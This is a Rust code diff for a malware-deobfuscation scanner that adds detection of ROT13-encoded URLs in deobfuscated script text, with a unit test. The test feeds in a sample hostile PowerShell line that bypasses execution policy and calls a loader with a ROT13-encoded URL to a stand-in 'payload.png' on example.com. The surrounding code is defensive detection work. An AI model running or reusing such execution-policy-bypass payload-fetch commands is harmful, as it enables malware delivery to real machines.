@@ -33,6 +33,12 @@ pub(crate) static URL_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static ROT13_URL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)\b(uggcf?:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|sgc:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|svyr:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)"#)
+        .expect("rot13 url sweep regex")
+});
+
+#[allow(clippy::expect_used)]
 static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
     // Matches:  \\<host>@<port>\<share>...
     // Where host is IP or hostname, port is digits or "SSL", share is anything non-whitespace
@@ -3428,6 +3434,7 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
     scan_extrac32_self_extract(deobfuscated, env);
     scan_ps_var_socket_connect(deobfuscated, env);
     scan_resolved_deob_var_fragment_urls(deobfuscated, env);
+    scan_rot13_urls_in_deob_text(deobfuscated, env);
 
     // Build a set of URLs already known
     let known = env.known_extracted_urls();
@@ -3468,6 +3475,64 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
             line_hint,
         });
     }
+}
+
+fn scan_rot13_urls_in_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let known = env.known_extracted_urls();
+    let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    for caps in ROT13_URL_RE.captures_iter(deobfuscated) {
+        let Some(m) = caps.get(1) else { continue };
+        let encoded = trim_url_suffix(m.as_str());
+        if encoded.len() < "uggc://k".len() {
+            continue;
+        }
+
+        let decoded = rot13_ascii(encoded);
+        let Some(url) = normalize_liberal_url_token(&decoded) else {
+            continue;
+        };
+        if !(url.starts_with("http://")
+            || url.starts_with("https://")
+            || url.starts_with("ftp://")
+            || url.starts_with("file://"))
+        {
+            continue;
+        }
+        if is_noise_url(&url) {
+            continue;
+        }
+        if is_known_or_known_query_prefix(&known, &url) {
+            continue;
+        }
+        if !seen_new.insert(url.clone()) {
+            continue;
+        }
+
+        let line_hint = deobfuscated
+            .lines()
+            .find(|line| line.contains(encoded) || line.contains(&url))
+            .map(|line| snippet_prefix(line, 200))
+            .unwrap_or_default();
+        if is_noise_url_context(&line_hint, &url) {
+            continue;
+        }
+
+        env.traits.push(Trait::DownloadInDeobText {
+            src: url,
+            line_hint,
+        });
+    }
+}
+
+fn rot13_ascii(text: &str) -> String {
+    text.bytes()
+        .map(|byte| match byte {
+            b'a'..=b'z' => (((byte - b'a' + 13) % 26) + b'a') as char,
+            b'A'..=b'Z' => (((byte - b'A' + 13) % 26) + b'A') as char,
+            _ => byte as char,
+        })
+        .collect()
 }
 
 fn scan_resolved_deob_var_fragment_urls(deobfuscated: &str, env: &mut Environment) {
@@ -6005,6 +6070,35 @@ mod js_atob_deob_text_tests {
                         && line_hint == "js-atob"
             )),
             "raw atob URL was not surfaced: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod rot13_url_tests {
+    use super::scan_deob_text;
+    use crate::env::Environment;
+    use crate::traits::Trait;
+    use crate::Config;
+
+    #[test]
+    fn rot13_url_in_deob_text_is_extracted() {
+        let mut env = Environment::new(&Config::default());
+
+        scan_deob_text(
+            r#"powershell -ExecutionPolicy Bypass -Command "[Fiber.Program]::Main('uggcf://rknzcyr.pbz/cnlybnq.cat')""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://example.com/payload.png")
+            }),
+            "ROT13 URL was not extracted from deob text: {:?}",
             env.traits
         );
     }
